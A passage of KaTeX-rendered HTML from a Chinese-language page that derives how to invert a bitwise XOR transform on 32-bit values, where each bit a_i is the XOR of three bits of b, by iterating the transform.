class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:13.589999999999995em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:15.03em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:16.470000000000006em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:17.91000000000001em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:19.350000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:22.790000000000013em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>代表32位bit<br />已知<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>，求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span></p><p>使<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>a</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>a</mi><mn>11</mn></msub><mo>⊕</mo><msub><mi>a</mi><mn>15</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = a_{0} \oplus a_{11} \oplus a_{15}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，余下的式子模32递增下标<br />可得<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>22</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>30</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0} \oplus b_{22} \oplus b_{30}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></p><p>重复上述操作得到<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>12</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>18</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0} \oplus b_{12} \oplus b_{18}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>于是我猜想可能在进行足够多次的迭代运算后得到的结果是<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0} \oplus b_{0} \oplus b_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord 